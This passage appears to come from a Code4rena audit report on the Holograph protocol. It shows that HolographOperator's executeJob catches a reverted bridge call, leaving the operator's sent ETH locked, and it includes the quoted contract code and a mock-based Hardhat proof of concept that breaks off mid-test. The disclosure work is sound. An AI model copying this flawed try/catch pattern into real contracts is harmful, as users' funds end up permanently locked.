class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">420</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">HolographOperatorInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">nonRevertingBridgeCall</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">421</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">422</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">bridgeInRequestPayload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">423</span><span class=\"mtk1\">:       )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">424</span><span class=\"mtk1\">:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">425</span><span class=\"mtk12\">:</span><span class=\"mtk1\">       </span><span class=\"mtk3\">/// @dev do nothing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">426</span><span class=\"mtk1\">:     } </span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">427</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">_failedJobs</span><span class=\"mtk1\">[</span><span class=\"mtk12\">hash</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">428</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FailedOperatorJob</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">429</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>Executing the <code>try ... {...} catch {...}</code> code mentioned above will execute <code>HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(...)</code>. Calling the <code>nonRevertingBridgeCall</code> function can possibly execute <code>revert(0, 0)</code> if the external call to the bridge contract is not successful. When this occurs, the code in the <code>catch</code> block of the <code>try ... {...} catch {...}</code> code mentioned above will run, which does not make calling the <code>executeJob</code> function revert. As a result, even though the job is not successfully executed, the sent ETH is locked in the <code>HolographOperator</code> contract since there is no other way to transfer such sent ETH out from this contract. In this situation, the operator that calls the <code>executeJob</code> function will lose the sent ETH.</p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439\">https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeJob</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bridgeInRequestPayload</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> execute the job</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">try</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">HolographOperatorInterface</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">nonRevertingBridgeCall</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bridgeInRequestPayload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">/// @dev do nothing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_failedJobs</span><span class=\"mtk1\">[</span><span class=\"mtk12\">hash</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FailedOperatorJob</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> every executed job (even if failed) increments total message counter by one</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ++</span><span class=\"mtk12\">_inboundMessageCounter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> reward operator (with HLG) for executing the job</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> this is out of scope and is purposefully omitted from code</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">////  _bondedOperators[msg.sender] += reward;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478\">https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonRevertingBridgeCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">msgSender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payload</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;HOLOGRAPH: operator only call&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">       * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> remove gas price from end</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">       */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">calldatacopy</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payload</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offset</span><span class=\"mtk1\">, </span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payload</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0x20</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">       * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> hToken recipient is injected right before making the call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">       */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x84</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msgSender</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">       * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> make non-reverting call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">       */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">result</span><span class=\"mtk1\"> := </span><span class=\"mtk10\">call</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// @dev gas limit is retrieved from last 32 bytes of payload in-memory value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">mload</span><span class=\"mtk1\">(</span><span class=\"mtk10\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk10\">payload</span><span class=\"mtk1\">.</span><span class=\"mtk10\">length</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0x40</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// @dev destination is bridge contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">sload</span><span class=\"mtk1\">(</span><span class=\"mtk10\">_bridgeSlot</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// @dev any value is passed along</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">callvalue</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// @dev data is retrieved from 0 index memory position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// @dev everything except for last 32 bytes (gas limit) is sent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk10\">payload</span><span class=\"mtk1\">.</span><span class=\"mtk10\">length</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0x40</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> </span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">result</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">return</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>First, please add the following <code>OperatorAndBridgeMocks.sol</code> file in <code>src\\mock\\</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// OperatorMock contract simulates the logic flows used in HolographOperator contract&#39;s executeJob and nonRevertingBridgeCall functions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">OperatorMock</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isJobExecuted</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">BridgeMock</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bridgeMock</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">BridgeMock</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// testExecuteJob function here simulates the logic flow used in HolographOperator.executeJob function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testExecuteJob</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IOperatorMock</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">testBridgeCall</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">isJobExecuted</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// testBridgeCall function here simulates the logic flow used in HolographOperator.nonRevertingBridgeCall function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testBridgeCall</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// as a simulation, the external call that sends ETH to bridgeMock contract will revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bridgeMock</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">success</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IOperatorMock</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testBridgeCall</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BridgeMock</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Then, please add the following <code>POC.ts</code> file in <code>test\\</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">expect</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;chai&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;hardhat&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;POC&#39;</span><span class=\"mtk1\">, () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;It is possible that operator loses sent ETH after calling HolographOperator contract&#39;s executeJob function&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// deploy operatorMock contract that simulates</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   the logic flows used in HolographOperator contract&#39;s executeJob and nonRevertingBridgeCall functions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">OperatorMockFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;OperatorMock&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operatorMock</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">OperatorMockFactory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operatorMock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deployed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operatorMock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">testExecuteJob</span><span class=\"mtk1\">({</span><span class=\"mtk12\">value:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">500</span><span class=\"mtk1\">});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// even though the job is not successfully executed, the sent ETH is locked in operatorMock contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isJobExecuted</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operatorMock</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isJobExecuted</span><span 